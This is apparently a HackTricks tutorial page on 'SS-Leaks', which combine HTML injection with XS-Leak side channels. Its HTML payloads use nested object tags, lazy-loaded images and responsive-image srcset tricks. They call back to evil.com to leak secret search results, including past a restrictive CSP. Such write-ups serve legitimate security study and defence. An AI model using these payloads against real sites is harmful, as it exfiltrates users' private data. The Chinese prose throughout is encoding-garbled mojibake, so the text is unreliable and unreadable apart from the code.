# SS-Leaks

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

è¿™æ˜¯ **æ‚¬æŒ‚æ ‡è®°å’Œ XS-Leaks çš„æ··åˆ**ã€‚ä¸€æ–¹é¢ï¼Œè¿™ä¸ªæ¼æ´å…è®¸æˆ‘ä»¬åœ¨ä¸€ä¸ªä¸æˆ‘ä»¬å°†è¦æ”»å‡»çš„é¡µé¢**åŒæº**çš„é¡µé¢ä¸­**æ³¨å…¥ HTML**ï¼ˆä½†ä¸èƒ½æ³¨å…¥ JSï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¸ä¼šç›´æ¥æ”»å‡»æˆ‘ä»¬å¯ä»¥æ³¨å…¥ HTML çš„é¡µé¢ï¼Œè€Œæ˜¯æ”»å‡»**å¦ä¸€ä¸ªé¡µé¢**ã€‚

## åµŒå¥—å¯¹è±¡

å¦‚æœ <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> ç«¯ç‚¹è¿”å› 404 çŠ¶æ€ç ï¼Œåˆ™åŠ è½½å†…éƒ¨çš„ `object`ï¼Œå¹¶å›è°ƒåˆ° <mark style="color:yellow;">`https://evil.com?callback=a`</mark>ï¼Œè®©æˆ‘ä»¬çŸ¥é“æœç´¢æŸ¥è¯¢ `a` æ²¡æœ‰äº§ç”Ÿç»“æœã€‚
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### æ‡’åŠ è½½

å¦‚æœCSPé˜»æ­¢å¤–éƒ¨å¯¹è±¡æ€ä¹ˆåŠï¼Ÿè®©æˆ‘ä»¬å†è¯•è¯•ä»¥ä¸‹CSPï¼š

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

æˆ‘ä»¬ä¸Šé¢çš„å›è°ƒ`object`ä¸å†èµ·ä½œç”¨ã€‚å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å›¾ç‰‡çš„[æ‡’åŠ è½½](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading)ï¼ä»¥ä¸‹å›¾ç‰‡åªä¼šåœ¨å¯è§ä¸”è·ç¦»è§†å£ä¸€å®šè·ç¦»æ—¶æ‰åŠ è½½ã€‚
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### å“åº”å¼å›¾ç‰‡

ä¸Šè¿°æŠ€æœ¯å¾ˆæ£’ï¼Œä½†å®ƒä¾èµ–äºæˆ‘ä»¬çš„HTMLæ³¨å…¥åœ¨ç”¨æˆ·çš„è§†å£å†…ã€‚

å¦‚æœæ³¨å…¥åœ¨å±å¹•å¤–ï¼Œå¹¶ä¸”ç”¨æˆ·ä¸æ»šåŠ¨ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥æ³„éœ²æ•°æ®å—ï¼Ÿå½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…ƒç´ IDå’Œ[scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096)æ¥åˆ›å»ºä¸€ä¸ªå¼ºåˆ¶æ»šåŠ¨çš„URLï¼Œä½†è¿™äº›ä¾èµ–äºç”¨æˆ·äº¤äº’ï¼Œå¹¶ä¸”æ— æ³•åœ¨çœŸå®åœºæ™¯ä¸­å®ç°ä¸€è‡´çš„æ•°æ®æ³„éœ²ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿå¯é åœ°åˆ©ç”¨å­˜å‚¨çš„HTMLæ³¨å…¥ã€‚

å“åº”å¼å›¾ç‰‡ç™»åœºï¼å…·ä½“æ¥è¯´ï¼Œæ˜¯å›¾åƒçš„`srcset`å’Œ`sizes`å±æ€§ã€‚

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

è¿™é‡Œæœ‰å¾ˆå¤šè¦è§£é‡Šçš„äº‹æƒ…ã€‚é¦–å…ˆï¼Œè¦è®°ä½ï¼Œåªæœ‰åœ¨æ³„æ¼çš„ç«¯ç‚¹è¿”å›404çŠ¶æ€ç æ—¶ï¼Œå†…éƒ¨iframeæ‰ä¼šå¯è§ã€‚

è¿™å¾ˆé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨è¦æœ‰æ¡ä»¶åœ°ä»ä¸¤ä¸ªä¸åŒçš„URLåŠ è½½iframeä¸­çš„å›¾åƒã€‚ä½¿ç”¨`sizes`å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨[åª’ä½“æŸ¥è¯¢](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS\_media\_queries/Using\_media\_queries)æ¥é€‰æ‹©æ ¹æ®è§†å£å¤§å°ä»å“ªä¸ªURLåŠ è½½å›¾åƒã€‚

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

å› ä¸ºæˆ‘ä»¬çš„ iframe çš„ `width="1000px"`ï¼Œä»¥ä¸‹æƒ…å†µä¼šå‘ç”Ÿï¼š

1. å¦‚æœæ³„æ¼çš„ç«¯ç‚¹è¿”å› 404 çŠ¶æ€ç ï¼Œåˆ™æ˜¾ç¤º iframeï¼Œå¹¶ä¸”å®½åº¦ä¸º 1000pxã€‚iframe ä¸­çš„å›¾åƒä¸ `(min-width: 1000px)` åª’ä½“æŸ¥è¯¢åŒ¹é…ï¼Œå¹¶ä» `https://evil.com?callback=0` åŠ è½½ 800px çš„å›¾åƒã€‚
2. å¦‚æœæ³„æ¼çš„ç«¯ç‚¹è¿”å› 200 çŠ¶æ€ç ï¼Œåˆ™ä¸æ˜¾ç¤º iframeã€‚ç”±äºå›¾åƒä¸æ˜¯ä½œä¸ºå¤§å‹ iframe çš„ä¸€éƒ¨åˆ†å‘ˆç°çš„ï¼Œå®ƒä¸ `(max-width 999px)` åª’ä½“æŸ¥è¯¢åŒ¹é…ï¼Œå¹¶ä» `https://evil.com?callback=1` åŠ è½½ 480px çš„å›¾åƒã€‚

## å‚è€ƒèµ„æ–™

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š** å—ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—® **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
